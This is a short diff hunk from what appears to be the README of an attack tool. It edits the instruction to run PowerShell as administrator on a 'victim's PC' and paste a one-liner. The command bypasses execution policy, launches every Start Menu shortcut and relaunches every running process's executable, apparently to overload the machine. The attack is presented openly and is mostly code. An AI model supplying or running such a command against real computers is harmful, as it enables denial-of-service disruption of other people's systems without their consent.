@@ -9,7 +9,7 @@
 
 # Medium level attack  Command
 
- RUN POWERSHELL AS ADMINSTRATOR ON VICTIM'S PC 
+ RUN POWERSHELL AS ADMINSTRATOR ON VICTIM'S PC AND PASTE 
  
 ```bash
 powershell -ExecutionPolicy Bypass -Command "Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs','C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs' -Recurse -Include *.lnk | ForEach { Start-Process $_.FullName -ErrorAction SilentlyContinue }; Get-Process | Where {$_.ProcessName -notin @('powershell','cmd','explorer')} | ForEach { Start-Process $_.MainModule.FileName -ErrorAction SilentlyContinue }"
